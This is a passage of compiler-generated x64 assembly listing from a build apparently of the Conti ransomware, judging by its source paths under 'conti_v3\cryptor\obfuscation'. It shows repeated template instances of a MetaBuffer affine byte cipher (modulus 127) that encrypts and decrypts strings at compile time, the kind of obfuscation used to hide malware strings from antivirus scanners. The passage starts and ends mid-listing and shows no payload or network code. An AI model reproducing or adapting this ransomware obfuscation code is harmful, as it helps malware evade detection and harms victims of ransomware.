  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEBA_NXZ PROC ; MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 5d 00 00 00	 mov	 ecx, 93			; 0000005dH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 5d
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+93]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 1c 00 00 00	 mov	 ecx, 28
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00016	41 f7 e8	 imul	 r8d
  00019	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001e	41 03 d0	 add	 edx, r8d
  00021	c1 fa 06	 sar	 edx, 6
  00024	8b ca		 mov	 ecx, edx
  00026	c1 e9 1f	 shr	 ecx, 31
  00029	03 d1		 add	 edx, ecx
  0002b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002e	44 2b c1	 sub	 r8d, ecx
  00031	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00035	41 f7 e8	 imul	 r8d
  00038	41 03 d0	 add	 edx, r8d
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b ca		 mov	 ecx, edx
  00040	c1 e9 1f	 shr	 ecx, 31
  00043	03 d1		 add	 edx, ecx
  00045	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00048	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004b	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004f	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 04	 add	 eax, 4
  00006	44 6b c0 07	 imul	 r8d, eax, 7
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 21 00 00 00	 mov	 ecx, 33			; 00000021H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 17	 imul	 r8d, ecx, 23

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 03	 add	 eax, 3
  00006	44 6b c0 0b	 imul	 r8d, eax, 11
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 42	 sub	 eax, 66			; 00000042H
  00006	44 6b c0 13	 imul	 r8d, eax, 19

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 42	 add	 r8d, 66			; 00000042H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 55 00 00 00	 mov	 ecx, 85			; 00000055H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 55	 add	 r8d, 85			; 00000055H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 30 00 00 00	 mov	 ecx, 48			; 00000030H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

